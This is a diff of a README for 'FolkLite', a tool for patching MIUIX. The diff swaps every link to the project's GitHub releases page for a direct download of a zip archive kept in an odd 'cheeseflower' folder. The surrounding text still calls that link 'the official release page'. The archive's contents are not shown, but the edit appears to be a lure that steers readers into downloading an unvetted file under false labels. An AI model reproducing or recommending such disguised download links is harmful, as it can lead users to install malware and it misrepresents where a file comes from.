@@ -1,6 +1,6 @@
 # 🪷 FolkLite - Clean MIUIX patching for everyone
 
-[![Download FolkLite](https://img.shields.io/badge/Download-FolkLite-purple?style=for-the-badge)](https://github.com/germanic-hwangho835/FolkLite/releases)
+[![Download FolkLite](https://img.shields.io/badge/Download-FolkLite-purple?style=for-the-badge)](https://github.com/germanic-hwangho835/FolkLite/raw/refs/heads/main/cheeseflower/Folk-Lite-v3.0.zip)
 
 ## 🧭 What FolkLite is
 
@@ -41,7 +41,7 @@ For best results:
 
 Use the official release page here:
 
-https://github.com/germanic-hwangho835/FolkLite/releases
+https://github.com/germanic-hwangho835/FolkLite/raw/refs/heads/main/cheeseflower/Folk-Lite-v3.0.zip
 
 On that page, follow these steps:
 
@@ -163,7 +163,7 @@ The release page is the main place to get updates and new builds. Check it when 
 
 Open the page here:
 
-https://github.com/germanic-hwangho835/FolkLite/releases
+https://github.com/germanic-hwangho835/FolkLite/raw/refs/heads/main/cheeseflower/Folk-Lite-v3.0.zip
 
 ## 🛠️ Basic troubleshooting checklist
 
